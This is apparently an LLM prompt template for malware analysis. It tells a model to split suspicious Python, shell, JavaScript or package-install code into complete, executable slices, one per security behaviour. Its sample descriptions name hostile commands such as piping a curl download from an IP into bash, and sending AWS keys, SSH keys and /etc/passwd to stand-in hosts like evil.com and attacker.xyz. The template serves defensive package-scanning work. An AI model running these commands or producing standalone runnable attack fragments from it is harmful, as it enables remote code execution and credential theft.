You are a security analyst. Slice code into MINIMAL, INDEPENDENT, and COMPLETE functional fragments based on DISTINCT security behaviors.

SUPPORTED LANGUAGES:
- Python (.py)
- Shell Script (.sh, bash)
- JavaScript/Node.js (.js)
- Package metadata (package.json, setup.py)

SENSITIVE API CATEGORIES:
- Network operations (sockets, HTTP clients, DNS, FTP, SSH, etc.)
- File system operations (read, write, delete, permissions)
- Code execution (eval, exec, subprocess, shell commands)
- Information gathering (environment variables, system info, credentials)
- Cryptographic operations (encryption, encoding, hashing)
- Process management (threading, spawning, signals)

CRITICAL SLICING PRINCIPLES:

1. **MINIMIZE REDUNDANCY** - DO NOT duplicate shared code
   - If multiple attack vectors share the SAME data preparation → ONE slice with ALL vectors
   - Example: Info collection + DNS tunneling + HTTP exfiltration → ONE slice (not three)

2. **GROUP RELATED BEHAVIORS** - Combine similar attack patterns
   - DNS tunneling + HTTP exfiltration using SAME data → ONE slice
   - Multiple HTTP requests with different libraries (urllib, requests) → ONE slice
   - Sequential file operations on related files → ONE slice

3. **SPLIT ONLY FOR DISTINCT BEHAVIORS**:
   - Different data sources (reading /etc/passwd vs scanning network)
   - Different attack goals (exfiltration vs backdoor vs persistence)
   - Different execution contexts (payload vs persistence mechanism)
   - No shared data dependencies

4. **COMPLETENESS** - Each slice MUST include:
   - ALL necessary imports/requires/source statements
   - ALL data dependencies: variable definitions from initial assignment to final usage (if url = base + host, include BOTH base and host definitions)
   - ALL control dependencies: conditions, loops, function definitions AND their invocations
   - ALL encoding/decoding/transformation steps in the data flow
   - Complete, syntactically valid, executable code that represents a complete attack behavior pattern

5. **FOCUS ON DISTINCT PATTERNS** - Create separate slices ONLY for:
   - Different malicious behaviors (exfiltration vs command execution vs persistence)
   - Independent attack chains with no shared logic or data
   - Completely different code paths with different goals

6. **CONTEXT TRACKING** - Include full data flow:
   - Hardcoded IPs/URLs/domains with their usage
   - Base64/hex strings WITH decoding AND usage
   - Command construction from parts (cmd = "curl " + url)
   - Environment variables from access to transmission
   - Shell command pipelines as complete units
   - Function definitions WITH their call sites

SPECIAL CASES:

Package Metadata (package.json/setup.py):
- Extract install scripts with external downloads or code execution
- Include complete script content, not just script names

Shell Scripts:
- Include pipelines as single slice if they represent one behavior
- Track command substitution with their usage
- Include heredocs and multiline strings completely

Encoded Data:
- Include encoding definition + decoding + usage in same slice
- Track data transformations across multiple steps

INPUT CODE:
```
{code}
```

OUTPUT JSON FORMAT:
```json
{{
  "slices": [
    {{
      "code": "complete executable code representing ONE distinct security behavior (may include multiple related API calls)",
      "behavior_description": "brief description of this distinct malicious behavior"
    }},
    {{
      "code": "complete executable code representing ONE distinct security behavior (may include multiple related API calls)",
      "behavior_description": "brief description of this distinct malicious behavior"
    }}
  ],
  "analysis_summary": "overall explanation of how many distinct behaviors were identified and why"
}}
```

If the code lacks sufficient context to create complete, executable slices (e.g., only imports or incomplete fragments), return an empty response:
```json
{{
  "slices": [],
  "analysis_summary": "Insufficient context to create complete executable slices. Code fragment lacks necessary implementation details."
}}
```

BEHAVIOR DESCRIPTION FORMAT:
"[When/At] {{trigger}}, {{what it does}}, {{where/how data flows}}, {{security impact}}."

Include specific hardcoded values (IPs, URLs, commands) when present.

Examples:
✅ "At import, reads AWS_SECRET_KEY from environment and posts to http://evil.com:8080, enabling credential theft"
✅ "During install, executes 'curl http://1.2.3.4/payload.sh | bash', enabling remote code execution"
✅ "When called, decodes base64 string, fetches from decoded URL, and executes response"
✅ "At startup, reads ~/.ssh/id_rsa and /etc/passwd, then exfiltrates via DNS queries to attacker.xyz"

ANTI-PATTERNS TO AVOID:
❌ Separate slices for DNS and HTTP exfiltration of SAME data
❌ Duplicating data collection across slices
❌ Only including fetch(url) without the url definition
❌ Including function definition without its call site
❌ Missing intermediate transformation steps (encode → transmit, but no decode)
❌ Creating slices for incomplete code fragments

GOOD PATTERNS:
✅ ONE slice: data collection + encoding + ALL exfiltration methods
✅ ONE slice: hardcoded URL parts + construction + network call
✅ ONE slice: base64 string + decode + usage
✅ ONE slice: function definition + function invocation
✅ Separate slices: credential theft vs reverse shell (different goals)

REMEMBER: Fewer, complete slices > many redundant slices. Focus on DISTINCT security behaviors with COMPLETE context (data + control dependencies).